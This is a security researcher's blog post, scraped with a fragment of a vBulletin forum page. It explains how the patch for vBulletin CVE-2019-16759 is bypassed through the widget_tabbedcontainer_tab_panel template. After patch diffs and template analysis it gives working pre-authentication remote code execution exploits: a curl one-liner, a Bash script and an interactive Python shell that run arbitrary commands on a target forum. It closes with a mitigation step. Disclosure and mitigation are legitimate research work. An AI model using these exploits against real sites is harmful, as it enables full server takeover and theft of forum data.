=== Content from blog.exploitee.rs_41fa1b5d_20250119_114133.html ===

#

* [Home](https://blog.exploitee.rs)
* [Wiki](http://exploitee.rs)
* [Forum](http://forum.exploitee.rs)

# [Exploiting vBulletin: ‚ÄúA Tale of a Patch Fail‚Äù](/2020/exploiting-vbulletin-a-tale-of-patch-fail/)

**Posted:** August 9th, 2020 | **Author:** [zenofex](/author/zenofex/ "Posts by zenofex") | **Filed under:** [Uncategorized](/category/uncategorized/) | [1 Comment ¬ª](/2020/exploiting-vbulletin-a-tale-of-patch-fail/#comments)

On September 23, 2019 [an undisclosed researcher released a bug which allowed for PHP remote code execution in vBulletin 5.0 through 5.4](https://seclists.org/fulldisclosure/2019/Sep/31). This bug (CVE-2019-16759) was labeled as a ‚Äòbugdoor‚Äô because of its simplicity by a [popular vulnerability broker](https://twitter.com/cbekrar/status/1176803541047861249) and was marked with a [CVSS 3.x score of 9.8](https://nvd.nist.gov/vuln/detail/CVE-2019-16759) giving it a critical rating.

Today, we‚Äôre going to talk about how the patch that was supplied for the vulnerability was inadequate in blocking exploitation, show how to bypass the resulting fix, and releasing a bash one-liner resulting in remote code execution in the latest vBulletin software.

## CVE-2019-16759

The vulnerability mentioned above was later formally labeled ‚ÄúCVE-2019-16759‚Äù and a patch was issued on September 25, 2019. Although the patch was provided in just under 3 days, the patch seemed, at the time, to fix the proof of concept exploit provided by the un-named finder.

The patch(s) consisted of three main changes provided in 2 sets of patches, the first being shown below.

| ``` 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136  ``` | ```          /**           *      Remove any problematic values from the template           *      variable arrays before rendering           */          //for now don't pass the values through.  These arrays are potentially large          //and we don't want to make unnecesary copies.  The alternative is to pass by          //reference which causes it's own headaches.  It's an internal function and the          //relevant arrays are all class variables.          private function cleanRegistered()          {                     $disallowedNames = array('widgetConfig');                  foreach($disallowedNames AS $name)                  {                             unset($this->registered[$name]);                          unset(self::$globalRegistered[$name]);                  }          } ``` |
| --- | --- |

/\*\*
\* Remove any problematic values from the template
\* variable arrays before rendering
\*/
//for now don't pass the values through. These arrays are potentially large
//and we don't want to make unnecesary copies. The alternative is to pass by
//reference which causes it's own headaches. It's an internal function and the
//relevant arrays are all class variables.
private function cleanRegistered()
{
$disallowedNames = array('widgetConfig');
foreach($disallowedNames AS $name)
{
unset($this->registered[$name]);
unset(self::$globalRegistered[$name]);
}
}

The above function was added but unfortunately had to be obtained from the code as opposed to directly from a diff between the two coded bases. This is because vBulletin doesn‚Äôt provide the older insecure versions of their software after a patch is released. Therefore, the above code was pulled directly from 5.5.4 Patch Level 2.

The above ‚ÄúcleanRegistered‚Äù function was added as the first fix to the vulnerability and simply iterates through a list of non-allowed ‚Äúregistered variables‚Äù, deleting their contents when found. This list when added only contained the name of the single variable which contained the php code to execute in the released exploit.

In the next version of the software (vBulletin 5.5.5), the following pieces were added to further prevent future problems with the widget\_rendering template code.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  ``` | ``` diff -ur vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php --- vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php	2020-08-08 06:40:31.356918994 -0500 +++ vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php	2020-08-08 06:40:40.577517014 -0500 @@ -286,20 +286,32 @@  			throw new vB5_Exception_Api('ajax', 'render', array(), 'invalid_request');  		} ¬† -		$this->router = new vB5_Frontend_Routing(); -		$this->router->setRouteInfo(array( -			'action'          => 'actionRender', -			'arguments'       => $serverData, -			'template'        => $routeInfo[2], -			// this use of $_GET appears to be fine, -			// since it's setting the route query params -			// not sending the data to the template -			// render -			'queryParameters' => $_GET, -		)); -		Api_InterfaceAbstract::setLight(); +		$templateName = $routeInfo[2]; +		if ($templateName == 'widget_php') +		{ +			$result = array( +				'template' => '', +				'css_links' => array(), +			); +		} +		else +		{ +			$this->router = new vB5_Frontend_Routing(); +			$this->router->setRouteInfo(array( +				'action'          => 'actionRender', +				'arguments'       => $serverData, +				'template'        => $templateName, +				// this use of $_GET appears to be fine, +				// since it's setting the route query params +				// not sending the data to the template +				// render +				'queryParameters' => $_GET, +			)); +			Api_InterfaceAbstract::setLight(); +			$result = vB5_Template::staticRenderAjax($templateName, $serverData); +		} ¬† -		$this->sendAsJson(vB5_Template::staticRenderAjax($routeInfo[2], $serverData)); +		$this->sendAsJson($result);  	} ¬†  	/** ``` |
| --- | --- |

diff -ur vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.4\_Patch\_Level\_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php
--- vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.4\_Patch\_Level\_2/upload/includes/vb5/frontend/applicationlight.php 2020-08-08 06:40:31.356918994 -0500
+++ vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php 2020-08-08 06:40:40.577517014 -0500
@@ -286,20 +286,32 @@
throw new vB5\_Exception\_Api('ajax', 'render', array(), 'invalid\_request');
}
- $this->router = new vB5\_Frontend\_Routing();
- $this->router->setRouteInfo(array(
- 'action' => 'actionRender',
- 'arguments' => $serverData,
- 'template' => $routeInfo[2],
- // this use of $\_GET appears to be fine,
- // since it's setting the route query params
- // not sending the data to the template
- // render
- 'queryParameters' => $\_GET,
- ));
- Api\_InterfaceAbstract::setLight();
+ $templateName = $routeInfo[2];
+ if ($templateName == 'widget\_php')
+ {
+ $result = array(
+ 'template' => '',
+ 'css\_links' => array(),
+ );
+ }
+ else
+ {
+ $this->router = new vB5\_Frontend\_Routing();
+ $this->router->setRouteInfo(array(
+ 'action' => 'actionRender',
+ 'arguments' => $serverData,
+ 'template' => $templateName,
+ // this use of $\_GET appears to be fine,
+ // since it's setting the route query params
+ // not sending the data to the template
+ // render
+ 'queryParameters' => $\_GET,
+ ));
+ Api\_InterfaceAbstract::setLight();
+ $result = vB5\_Template::staticRenderAjax($templateName, $serverData);
+ }
- $this->sendAsJson(vB5\_Template::staticRenderAjax($routeInfo[2], $serverData));
+ $this->sendAsJson($result);
}
/\*\*

This portion of the patch created an if statement that would return empty template or css data if the ‚Äòwidget\_php‚Äô template was listed as the last portion of the route. These two changes prevented the PoC from functioning in its released state.

The third change can be found in the second part of the vBulletin 5.5.5 update diff.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ``` | ```  	diff -ur vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php --- vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/template/runtime.php	2020-08-08 06:40:31.276913797 -0500 +++ vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php	2020-08-08 06:40:40.493511575 -0500 @@ -12,6 +12,26 @@ ¬†  class vB5_Template_Runtime  { +	//This is intended to allow the runtime to know that template it is rendering. +	//It's ugly and shouldn't be used lightly, but making some features widely +	//available to all templates is uglier. +	private static $templates = array(); + +	public static function startTemplate($template) +	{ +		array_push(self::$templates, $template); +	} + +	public static function endTemplate() +	{ +		array_pop(self::$templates); +	} + +	private static function currentTemplate() +	{ +		return end(self::$templates); +	} +  	public static $units = array(  		'%',  		'px', @@ -1944,6 +1964,21 @@  			return '<div style="border:1px solid red;padding:10px;margin:10px;">' . htmlspecialchars($timerName) . ': ' . $elapsed . '</div>';  		}  	} + +	public static function evalPhp($code) +	{ +		//only allow the PHP widget template to do this.  This prevents a malicious user +		//from hacking something into a different template. +		if (self::currentTemplate() != 'widget_php') +		{ +			return ''; +		} +		ob_start(); +		eval($code); +		$output = ob_get_contents(); +		ob_end_clean(); +		return $output; +	}  } ``` |
| --- | --- |

diff -ur vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.4\_Patch\_Level\_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php
--- vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.4\_Patch\_Level\_2/upload/includes/vb5/template/runtime.php 2020-08-08 06:40:31.276913797 -0500
+++ vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php 2020-08-08 06:40:40.493511575 -0500
@@ -12,6 +12,26 @@
class vB5\_Template\_Runtime
{
+ //This is intended to allow the runtime to know that template it is rendering.
+ //It's ugly and shouldn't be used lightly, but making some features widely
+ //available to all templates is uglier.
+ private static $templates = array();
+
+ public static function startTemplate($template)
+ {
+ array\_push(self::$templates, $template);
+ }
+
+ public static function endTemplate()
+ {
+ array\_pop(self::$templates);
+ }
+
+ private static function currentTemplate()
+ {
+ return end(self::$templates);
+ }
+
public static $units = array(
'%',
'px',
@@ -1944,6 +1964,21 @@
return '<div style="border:1px solid red;padding:10px;margin:10px;">' . htmlspecialchars($timerName) . ': ' . $elapsed . '</div>';
}
}
+
+ public static function evalPhp($code)
+ {
+ //only allow the PHP widget template to do this. This prevents a malicious user
+ //from hacking something into a different template.
+ if (self::currentTemplate() != 'widget\_php')
+ {
+ return '';
+ }
+ ob\_start();
+ eval($code);
+ $output = ob\_get\_contents();
+ ob\_end\_clean();
+ return $output;
+ }
}

This portion was added as a layer of redundancy to attempt to prevent any non ‚Äòwidget\_php‚Äô template from loading the eval code. Based on the comment in the code, this is an attempt to prevent a user from modifying a template to incorrectly call the ‚ÄòevalPhp‚Äô without doing so from an embedded php widget.

## Problems Ahead

The problem with the above arises because of how the vBulletin template system is structured. Specifically, templates aren‚Äôt actually written in PHP but instead are written in a language that is first processed by the template engine and then is output as a string of PHP code that is later ran through an eval() during the ‚Äúrendering‚Äù process. Templates are also not a standalone item but can be nested within other templates, in that one template can have a number of child templates embedded within. For example, take the following template.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  ``` | ``` 		<template name="widget_php" templatetype="template" date="1569453621" username="vBulletin" version="5.5.5 Alpha 4"><![CDATA[<vb:if condition="empty($widgetConfig) AND !empty($widgetinstanceid)"> 	{vb:data widgetConfig, widget, fetchConfig, {vb:raw widgetinstanceid}} </vb:if> ¬† <vb:if condition="!empty($widgetConfig)"> 	{vb:set widgetid, {vb:raw widgetConfig.widgetid}} 	{vb:set widgetinstanceid, {vb:raw widgetConfig.widgetinstanceid}} </vb:if> ¬† <div class="b-module{vb:var widgetConfig.show_at_breakpoints_css_classes} canvas-widget default-widget custom-html-widget" id="widget_{vb:raw widgetinstanceid}" data-widget-id="{vb:raw widgetid}" data-widget-instance-id="{vb:raw widgetinstanceid}"> ¬† 	{vb:template module_title, 		widgetConfig={vb:raw widgetConfig}, 		show_title_divider=1, 		can_use_sitebuilder={vb:raw user.can_use_sitebuilder}} ¬† 	<div class="widget-content"> 		<vb:if condition="!empty($widgetConfig['code']) AND !$vboptions['disable_php_rendering']"> 			<vb:comment> 				Do not eval anything other than the widgetConfig code -- anything else could potentially come 				from a malicious user.  Do not use phpeval outside of this template.  Ever. 			</vb:comment> 			{vb:phpeval {vb:raw widgetConfig.code}} 		<vb:else /> 			<vb:if condition="$user['can_use_sitebuilder']"> 				<span class="note">{vb:phrase click_edit_to_config_module}</span> 			</vb:if> 		</vb:if> 	</div> </div>]]></template> ``` |
| --- | --- |

<template name="widget\_php" templatetype="template" date="1569453621" username="vBulletin" version="5.5.5 Alpha 4"><![CDATA[<vb:if condition="empty($widgetConfig) AND !empty($widgetinstanceid)">
{vb:data widgetConfig, widget, fetchConfig, {vb:raw widgetinstanceid}}
</vb:if>
<vb:if condition="!empty($widgetConfig)">
{vb:set widgetid, {vb:raw widgetConfig.widgetid}}
{vb:set widgetinstanceid, {vb:raw widgetConfig.widgetinstanceid}}
</vb:if>
<div class="b-module{vb:var widgetConfig.show\_at\_breakpoints\_css\_classes} canvas-widget default-widget custom-html-widget" id="widget\_{vb:raw widgetinstanceid}" data-widget-id="{vb:raw widgetid}" data-widget-instance-id="{vb:raw widgetinstanceid}">
{vb:template module\_title,
widgetConfig={vb:raw widgetConfig},
show\_title\_divider=1,
can\_use\_sitebuilder={vb:raw user.can\_use\_sitebuilder}}
<div class="widget-content">
<vb:if condition="!empty($widgetConfig['code']) AND !$vboptions['disable\_php\_rendering']">
<vb:comment>
Do not eval anything other than the widgetConfig code -- anything else could potentially come
from a malicious user. Do not use phpeval outside of this template. Ever.
</vb:comment>
{vb:phpeval {vb:raw widgetConfig.code}}
<vb:else />
<vb:if condition="$user['can\_use\_sitebuilder']">
<span class="note">{vb:phrase click\_edit\_to\_config\_module}</span>
</vb:if>
</vb:if>
</div>
</div>]]></template>

This template would be rendered to the following PHP code.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  ``` | ``` $final_rendered = '' . '';  if (empty($widgetConfig) AND !empty($widgetinstanceid)) {   $final_rendered .= '\r\n\t' . '';    $widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);   $final_rendered .= '' . '\r\n';\n\t\t\t\t } else {   $final_rendered .= ''; } $final_rendered .= '' . '\r\n\r\n' . ''; if (!empty($widgetConfig)) {   $final_rendered .= '\r\n\t' . '';   $widgetid = $widgetConfig['widgetid'];   $final_rendered .= '' . '\r\n\t' . '';   $widgetinstanceid = $widgetConfig['widgetinstanceid'];   $final_rendered .= '' . '\r\n';\n\t\t\t\t } else {   $final_rendered .= ''; } $final_rendered .= '' . '\r\n\r\n<div class="b-module' . vB5_Template_Runtime::vBVar($widgetConfig['show_at_breakpoints_css_classes']) . ' canvas-widget default-widget custom-html-widget" id="widget_' . $widgetinstanceid . '" data-widget-id="' . $widgetid . '" data-widget-instance-id="' . $widgetinstanceid . '">\r\n\r\n\t' . vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' => $widgetConfig, 'show_title_divider' => '1', 'can_use_sitebuilder' => $user['can_use_sitebuilder'])) . '\r\n\r\n\t<div class="widget-content">\r\n\t\t' . ''; ¬† if (!empty($widgetConfig['code']) AND !vB::getDatastore()->getOption('disable_php_rendering')) {   $final_rendered .= '\r\n\t\t\t' . '' . '\r\n\t\t\t' . vB5_Template_Runtime::evalPhp('' . $widgetConfig['code'] . '') . '\r\n\t\t'; } else {   $final_rendered .= '\r\n\t\t\t' . '';   if ($user['can_use_sitebuilder']) {     $final_rendered .= '\r\n\t\t\t\t<span class="note">' . vB5_Template_Runtime::parsePhrase("click_edit_to_config_module") . '</span>\r\n\t\t\t';   } else {     $final_rendered .= '';   }   $final_rendered .= '' . '\r\n\t\t'; } $final_rendered .= '' . '\r\n\t</div>\r\n</div>'; ``` |
| --- | --- |

$final\_rendered = '' . '';
if (empty($widgetConfig) AND !empty($widgetinstanceid)) {
$final\_rendered .= '\r\n\t' . '';
$widgetConfig = vB5\_Template\_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);
$final\_rendered .= '' . '\r\n';\n\t\t\t\t
} else {
$final\_rendered .= '';
}
$final\_rendered .= '' . '\r\n\r\n' . '';
if (!empty($widgetConfig)) {
$final\_rendered .= '\r\n\t' . '';
$widgetid = $widgetConfig['widgetid'];
$final\_rendered .= '' . '\r\n\t' . '';
$widgetinstanceid = $widgetConfig['widgetinstanceid'];
$final\_rendered .= '' . '\r\n';\n\t\t\t\t
} else {
$final\_rendered .= '';
}
$final\_rendered .= '' . '\r\n\r\n<div class="b-module' . vB5\_Template\_Runtime::vBVar($widgetConfig['show\_at\_breakpoints\_css\_classes']) . ' canvas-widget default-widget custom-html-widget" id="widget\_' . $widgetinstanceid . '" data-widget-id="' . $widgetid . '" data-widget-instance-id="' . $widgetinstanceid . '">\r\n\r\n\t' . vB5\_Template\_Runtime::includeTemplate('module\_title',array('widgetConfig' => $widgetConfig, 'show\_title\_divider' => '1', 'can\_use\_sitebuilder' => $user['can\_use\_sitebuilder'])) . '\r\n\r\n\t<div class="widget-content">\r\n\t\t' . '';
if (!empty($widgetConfig['code']) AND !vB::getDatastore()->getOption('disable\_php\_rendering')) {
$final\_rendered .= '\r\n\t\t\t' . '' . '\r\n\t\t\t' . vB5\_Template\_Runtime::evalPhp('' . $widgetConfig['code'] . '') . '\r\n\t\t';
} else {
$final\_rendered .= '\r\n\t\t\t' . '';
if ($user['can\_use\_sitebuilder']) {
$final\_rendered .= '\r\n\t\t\t\t<span class="note">' . vB5\_Template\_Runtime::parsePhrase("click\_edit\_to\_config\_module") . '</span>\r\n\t\t\t';
} else {
$final\_rendered .= '';
}
$final\_rendered .= '' . '\r\n\t\t';
}
$final\_rendered .= '' . '\r\n\t</div>\r\n</div>';

Then after being rendered, when the code is later pushed through the eval process, the other portion of its child templates are loaded and also ran through eval.

This type of system may seem innocuous to the untrained eye but the approach opens up a number of issues beyond just the insecure uses of an eval calls.

Regardless, here are a few ways this can fail.

* Any non-filtered modifications to the output variable will open up the code for another code execution.
* Constant filtering required of all template code for situations which can create non-escaped PHP.
* XSS filtering nightmares
* Included child code will have access to parent declared variables.

I cannot think of many situations where this would be the optimal approach. However, to keep this analysis to the point, I‚Äôll focus on the issues leading to a bypass.

## Bypassing CVE-2019-16759

The patch code mentioned in one of the previous sections above may seem thorough, but the approach is actually somewhat short sighted. Specifically, the patch faces issues when encountering a user controlled child template in that a parent template will be checked to verify that the routestring does not end with a widget\_php route. However we are still prevented from providing a payload within the widgetConfig value because of code within the rendering process, which cleans the widgetConfig value prior to the templates execution. This problem is remedied for us because of a lucky solution manifesting in the following template.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ``` | ``` 		<template name="widget_tabbedcontainer_tab_panel" templatetype="template" date="1532130449" username="vBulletin" version="5.4.4 Alpha 2"><![CDATA[{vb:set panel_id, {vb:concat {vb:var id_prefix}, {vb:var tab_num}}} <div id="{vb:var panel_id}" class="h-clearfix js-show-on-tabs-create h-hide"> 	<vb:comment> 	- {vb:var panel_id}  	<vb:each from="subWidgets" value="subWidget"> 	&nbsp;&nbsp;-- {vb:raw subWidget.template} 	</vb:each> 	</vb:comment> ¬† 	<vb:each from="subWidgets" value="subWidget"> 		{vb:template {vb:raw subWidget.template},  			widgetConfig={vb:raw subWidget.config},  			widgetinstanceid={vb:raw subWidget.widgetinstanceid}, 			widgettitle={vb:raw subWidget.title},  			tabbedContainerSubModules={vb:raw subWidget.tabbedContainerSubModules}, 			product={vb:raw subWidget.product} 		} 	</vb:each> ¬† ¬† </div>]]></template> ``` |
| --- | --- |

<template name="widget\_tabbedcontainer\_tab\_panel" templatetype="template" date="1532130449" username="vBulletin" version="5.4.4 Alpha 2"><![CDATA[{vb:set panel\_id, {vb:concat {vb:var id\_prefix}, {vb:var tab\_num}}}
<div id="{vb:var panel\_id}" class="h-clearfix js-show-on-tabs-create h-hide">
<vb:comment>
- {vb:var panel\_id}
<vb:each from="subWidgets" value="subWidget">
&nbsp;&nbsp;-- {vb:raw subWidget.template}
</vb:each>
</vb:comment>
<vb:each from="subWidgets" value="subWidget">
{vb:template {vb:raw subWidget.template},
widgetConfig={vb:raw subWidget.config},
widgetinstanceid={vb:raw subWidget.widgetinstanceid},
widgettitle={vb:raw subWidget.title},
tabbedContainerSubModules={vb:raw subWidget.tabbedContainerSubModules},
product={vb:raw subWidget.product}
}
</vb:each>
</div>]]></template>

The template ‚Äúwidget\_tabbedcontainer\_tab\_panel‚Äù, which is displayed above is a perfect assistant in bypassing the previous CVE-2019-16759 patch because of two key features.

1. The templates ability to load a user controlled child template.
2. The template loads the child template by taking a value from a separately named value and placing it into a variable named ‚ÄúwidgetConfig‚Äù.

**These two characteristics of the ‚Äúwidget\_tabbedcontainer\_tab\_panel‚Äù template allow us to effectively bypass all filtering previously done to prevent CVE-2019-16759 from being exploited.**

## PoC

Because of the vulnerabilities simplicity, creating a one line command line exploit is as simple as the following.

| ``` 1  ``` | ``` curl -s http://EXAMPLE.COM/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' ``` |
| --- | --- |

curl -s http://EXAMPLE.COM/ajax/render/widget\_tabbedcontainer\_tab\_panel -d 'subWidgets[0][template]=widget\_php&subWidgets[0][config][code]=phpinfo();'

## Full Exploit(s)

Below is a list of a few full exploit payloads written in multiple different languages including Bash, Python and Ruby.

### Bash Exploit

| ``` 1 2 3 4 5 6 7 8 9  ``` | ``` #!/bin/bash # # vBulletin (widget_tabbedcontainer_tab_panel) 5.x 0day by @Zenofex #<br># Usage ./exploit <site> <shell-command><br> # Urlencode cmd CMD=`echo $2|perl -MURI::Escape -ne 'chomp;print uri_escape($_),"\n"'` ¬† # Send request curl -s $1/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20shell_exec("'+$CMD+'");exit;' ``` |
| --- | --- |

#!/bin/bash
#
# vBulletin (widget\_tabbedcontainer\_tab\_panel) 5.x 0day by @Zenofex
#<br># Usage ./exploit <site> <shell-command><br>
# Urlencode cmd
CMD=`echo $2|perl -MURI::Escape -ne 'chomp;print uri\_escape($\_),"\n"'`
# Send request
curl -s $1/ajax/render/widget\_tabbedcontainer\_tab\_panel -d 'subWidgets[0][template]=widget\_php&subWidgets[0][config][code]=echo%20shell\_exec("'+$CMD+'");exit;'

### Python Exploit

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ``` | ``` #!/usr/bin/env python3 # vBulletin 5.x pre-auth widget_tabbedContainer RCE exploit by @zenofex ¬† import argparse import requests import sys ¬† def run_exploit(vb_loc, shell_cmd):     post_data = {'subWidgets[0][template]' : 'widget_php',                 'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % shell_cmd                 }     r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % vb_loc, post_data)     return r.text ¬† ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget Template RCE') ap.add_argument('-l', '--location', required=True, help='Web address to root of vB5 install.') ARGS = ap.parse_args() ¬† while True:     try:         cmd = input("vBulletin5$ ")         print(run_exploit(ARGS.location, cmd))     except KeyboardInterrupt:         sys.exit("\nClosing shell...")     except Exception as e:         sys.exit(str(e)) ``` |
| --- | --- |

#!/usr/bin/env python3
# vBulletin 5.x pre-auth widget\_tabbedContainer RCE exploit by @zenofex
import argparse
import requests
import sys
def run\_exploit(vb\_loc, shell\_cmd):
post\_data = {'subWidgets[0][template]' : 'widget\_php',
'subWidgets[0][config][code]' : "echo shell\_exec('%s'); exit;" % shell\_cmd
}
r = requests.post('%s/ajax/render/widget\_tabbedcontainer\_tab\_panel' % vb\_loc, post\_data)
return r.text
ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget Template RCE')
ap.add\_argument('-l', '--location', required=True, help='Web address to root of vB5 install.')
ARGS = ap.parse\_args()
while True:
try:
cmd = input("vBulletin5$ ")
print(run\_exploit(ARGS.location, cmd))
except KeyboardInterrupt:
sys.exit("\nClosing shell...")
except Exception as e:
sys.exit(str(e))

### Metasploit Module

We‚Äôre also in the process of pushing a public metasploit module to the metasploit-framework project, the pull request for which can be [found here](https://github.com/rapid7/metasploit-framework/pull/13970)

![](/wp-content/uploads/2020/08/image.png)
## Slides

I‚Äôve also published slides: [Exploiting vBulletin 5.6.2 ‚Äì A Tale of a Patch Fail](https://download.exploitee.rs/file/vbulletin/Exploiting_vBulletin_5.6.2_A_Tale_of_a_Patch_Fail.pptx)

## A Short Term Fix

This fix will disable PHP widgets within your forums and may break some functionality but will keep you safe from attacks until a patch is released by vBulletin.

1. Go to the vBulletin administrator control panel.
2. Click ‚ÄúSettings‚Äù in the menu on the left, then ‚ÄúOptions‚Äù in the dropdown.
3. Choose ‚ÄúGeneral Settings‚Äù and then click ‚ÄúEdit Settings‚Äù
4. Look for ‚ÄúDisable PHP, Static HTML, and Ad Module rendering‚Äù, Set to ‚ÄúYes‚Äù
5. Click ‚ÄúSave‚Äù

Godspeed and Happy DEFCON Safe Mode

---

### One Comment on ‚ÄúExploiting vBulletin: ‚ÄúA Tale of a Patch Fail‚Äù‚Äù

1. ![](https://secure.gravatar.com/avatar/514ea4c08faf79df094f26988b0bf4e0?s=26&d=identicon&r=r)
   1
   [hacxx](http://Website)¬†said at 8:05 pm on August 16th, 2020:

   Seems like your vuln is already patched. I test it today against a few vBulletin 5 and it doesn‚Äôt work.

### Recent Posts

* [ORP ‚Äì The Open Research Project](/2021/orp-the-open-research-project/)
* [ViziOwn ‚Äì Exploiting the Vizio SmartCast Platform](/2021/viziown-exploiting-vizio-smartcast/)
* [Exploiting vBulletin: ‚ÄúA Tale of a Patch Fail‚Äù](/2020/exploiting-vbulletin-a-tale-of-patch-fail/)
* [Rooting the FireTV Cube and Pendant with FireFU](/2018/rooting-the-firetv-cube-and-pendant-with-firefu/)
* [All Your Things Are Belong To Us](/2017/all-your-things-are-belong-to-us/)

### Archives

* [April 2021](/2021/04/)
* [February 2021](/2021/02/)
* [August 2020](/2020/08/)
* [October 2018](/2018/10/)
* [August 2017](/2017/08/)
* [March 2017](/2017/03/)
* [January 2017](/2017/01/)
* [October 2015](/2015/10/)
* [February 2015](/2015/02/)
* [December 2014](/2014/12/)
* [June 2014](/2014/06/)
* [December 2013](/2013/12/)
* [August 2013](/2013/08/)
* [July 2013](/2013/07/)
* [May 2013](/2013/05/)
* [January 2013](/2013/01/)
* [December 2012](/2012/12/)
* [August 2012](/2012/08/)
* [July 2012](/2012/07/)
* [February 2012](/2012/02/)
* [December 2011](/2011/12/)
* [November 2011](/2011/11/)
* [October 2011](/2011/10/)
* [August 2011](/2011/08/)
* [July 2011](/2011/07/)
* [June 2011](/2011/06/)
* [May 2011](/2011/05/)
* [April 2011](/2011/04/)
* [February 2011](/2011/02/)
* [January 2011](/2011/01/)

### Categories

* [Asus](/category/asus/)
* [Google TV Kernels](/category/google-tv-kernels/)
* [GTVHacker](/category/gtvhacker/)
* [Hisense](/category/hisense/)
* [Logitech Revue](/category/logitech-revue/)
* [NAS](/category/nas/)
* [Nest](/category/nest/)
* [Netgear](/category/netgear/)
* [Roku](/category/roku/)
* [Root](/category/root/)
* [Routers](/category/routers/)
* [Sony](/category/sony-2/)
* [Uncategorized](/category/uncategorized/)
* [Updates](/category/updates/)
* [Western Digital](/category/western-digital/)

¬© Copyright 2025 | Exploitee.rs | All Rights Reserved



=== Content from forum.vbulletin.com_e6d92716_20250119_114134.html ===


* Login or Sign Up
  + Logging in...

    Remember me

    Log in

    Or
    [Sign Up](https://forum.vbulletin.com/register?urlpath=aHR0cHM6Ly9mb3J1bS52YnVsbGV0aW4uY29tLy9mb3J1bS92YnVsbGV0aW4tYW5ub3VuY2VtZW50cy92YnVsbGV0aW4tYW5ub3VuY2VtZW50c19hYS80NDQ1MjI3LXZidWxsZXRpbi01LTYtMC01LTYtMS01LTYtMi1zZWN1cml0eS1wYXRjaA%3D%3D)

    [Forgot password or user name?](https://forum.vbulletin.com/lostpw)
  + Log in with
    Facebook
    Sign-in with Twitter
    Sign-in with Google

[![Logo](images/misc/vb_logo_darkblue.svg "Powered by vBulletin")](https://forum.vbulletin.com/)

* + Search in titles only
    Search in vBulletin Announcements only
    Search
  + Advanced Search

* Forums
* [Articles](articles)
* [Blogs](blogs)
* [Add-ons](add-ons)
* [Purchase](https://www.vbulletin.com/purchases/)

* [Trending Topics](trending)
* [Member List](memberlist)
* [Calendar](calendar)

* [Home](https://forum.vbulletin.com)
* [Forum](https://forum.vbulletin.com/forum)
* [vBulletin Announcements](https://forum.vbulletin.com/forum/vbulletin-announcements)
* [vBulletin Announcements](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa)

* Welcome to the vBulletin support forums! In our community forums you can receive professional support and assistance with any issues you might have with your vBulletin Products.

  Useful Links for Guests: [Community Registration](https://forum.vbulletin.com/register) | [vBulletin System Requirements](https://forum.vbulletin.com/node/4387853) | [vBulletin Installation Guide](https://forum.vbulletin.com/node/4391348)

  If you are having problems posting in the relevant areas for your software, please see this [topic](https://forum.vbulletin.com/forum/vbulletin-sales-and-feedback/site-feedback/81568-why-can-t-i-post-or-download-files#post3514457).
* **Telephone Sales and Support Status**

  Due to Martin Luther King Day in the United States, our telephone services will be closed on Monday January 20th. This includes both the Sales and Support lines. Service will resume again during normal business hours on Tuesday, January 21st.

  We apologize for any inconvenience this may cause.

# vBulletin 5.6.0, 5.6.1, 5.6.2 Security Patch

Collapse

X

Collapse

* [Posts](#thread-view-tab)
* [Latest Activity](#stream-view-tab)
* [Photos](#media-view-tab)

* Page

  of
  1
* Filter

* Time
  All Time
  Today
  Last Week
  Last Month
* Show
  All
  Discussions only
  Photos only
  Videos only
  Links only
  Polls only
  Events only

Filtered by:

Clear All

 new posts

Previous
[template](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch)
Next

